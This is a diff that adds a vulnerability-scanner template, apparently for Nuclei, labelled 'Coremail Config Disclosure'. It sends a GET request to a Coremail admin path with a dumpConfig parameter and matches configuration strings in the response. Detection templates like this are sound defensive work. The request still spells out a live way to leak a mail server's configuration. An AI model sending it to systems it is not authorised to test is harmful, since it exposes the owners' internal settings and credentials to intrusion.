@@ -1,0 +1,24 @@
+id: coremail-config-disclosure
+info:
+  author: princechaddha
+  name: Coremail Config Disclosure
+  reference:
+  - https://www.secpulse.com/archives/107611.html
+  severity: high
+  tags: config,exposure
+requests:
+- matchers:
+  - condition: or
+    type: word
+    words:
+    - <object name="cm_md_db">
+    - containerDefinitions
+    - <string name="User">coremail</string>
+    - <string name="EnableCoremailSmtp">
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/'
